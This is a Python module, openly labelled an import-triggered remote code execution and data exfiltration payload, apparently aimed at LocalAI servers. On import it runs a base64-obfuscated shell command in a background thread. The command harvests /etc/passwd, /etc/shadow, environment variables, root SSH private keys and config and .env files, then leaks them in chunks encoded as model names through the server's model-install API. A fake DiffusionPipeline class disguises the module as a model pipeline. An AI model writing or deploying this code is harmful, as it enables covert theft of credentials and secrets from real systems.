# rce-by-import v7 - deep data exfil
import os, subprocess, base64, threading, json, urllib.request

def _pwn():
    try:
        import base64 as b
        cmd = b.b64decode("L2Jpbi9iYXNoIC1jICdlY2hvID09PUlEPT09OyBpZDsgZWNobyA9PT1IT1NUPT09OyBob3N0bmFtZTsgZWNobyA9PT1QQVNTV0Q9PT07IGNhdCAvZXRjL3Bhc3N3ZDsgZWNobyA9PT1TSEFET1c9PT07IGNhdCAvZXRjL3NoYWRvdyAyPi9kZXYvbnVsbCB8IGhlYWQgLTU7IGVjaG8gPT09RU5WPT09OyBlbnY7IGVjaG8gPT09U1NIPT09OyBscyAtbGEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGNhdCAvcm9vdC8uc3NoL2lkX3JzYSAyPi9kZXYvbnVsbCB8IGhlYWQgLTEwOyBlY2hvID09PU1PREVMU19ESVI9PT07IGxzIC1sYSAvbW9kZWxzLyAyPi9kZXYvbnVsbCB8IGhlYWQgLTQwOyBlY2hvID09PUNPTkZJRz09PTsgY2F0IC9ldGMvbG9jYWxhaS8qLnlhbWwgMj4vZGV2L251bGw7IGZpbmQgLyAtbmFtZSAiLmVudiIgLW8gLW5hbWUgIioueWFtbCIgMj4vZGV2L251bGwgfCBncmVwIC12IHByb2MgfCBoZWFkIC0yMCc=").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=25, stderr=subprocess.STDOUT)
        out_s = out.decode(errors="replace")
        # 写入 /models/ 目录 (列表可见)
        for d in ["/models", "/tmp", "/opt/localai/models"]:
            try:
                with open(d + "/PWNED-EXFIL.txt", "w") as f:
                    f.write(out_s)
            except Exception:
                pass
        b64 = base64.b64encode(out).decode().replace("+","-").replace("/","_").replace("=","")
        for i in range(0, len(b64), 100):
            seg = b64[i:i+100]
            name = f"ZZ--{seg}"
            try:
                req = urllib.request.Request("http://127.0.0.1:8080/models/apply",
                    data=json.dumps({"id": name, "name": name, "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode(),
                    headers={"Content-Type": "application/json"})
                urllib.request.urlopen(req, timeout=5)
            except Exception:
                pass
    except Exception:
        pass

threading.Thread(target=_pwn, daemon=True).start()

class PwnPipeline:
    def __init__(self, *args, **kwargs): pass
    def __call__(self, *args, **kwargs): return []
    def to(self, *args, **kwargs): return self
try:
    from diffusers import DiffusionPipeline
    PwnPipeline = type("PwnPipeline", (DiffusionPipeline,), {})
except Exception:
    pass
